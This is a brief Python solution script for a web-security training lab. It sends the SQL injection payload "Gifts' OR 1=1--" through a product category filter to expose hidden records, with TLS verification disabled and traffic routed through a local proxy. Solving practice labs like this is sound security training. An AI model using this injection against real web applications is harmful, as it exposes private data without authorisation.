# Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

import requests
from requests.utils import requote_uri
import sys

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

r = requests.Session()
target_url = "https://0a9a000c03b58eabc032376f00d6005c.web-security-academy.net"
proxies = {
    'https':'http://127.0.0.1:8080',
    'http':'http://127.0.0.1:8080'
}

# Retrieve All Data exploiting SQLi
def sql_injection():
    payload = "Gifts' OR 1=1--"
    url = target_url + "/filter?category=" + payload
    url = requote_uri(url)
    print(url)
    print("[+] Payload Created")
    
    headers = {
        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0'
    }
    out = r.get(url, headers = headers, verify = False, proxies = proxies)
    print("[+] Payload Sent")

    if out.status_code == 200:
        print(out.content)
        print("[+] Exploited")
        sys.exit(0)

sql_injection()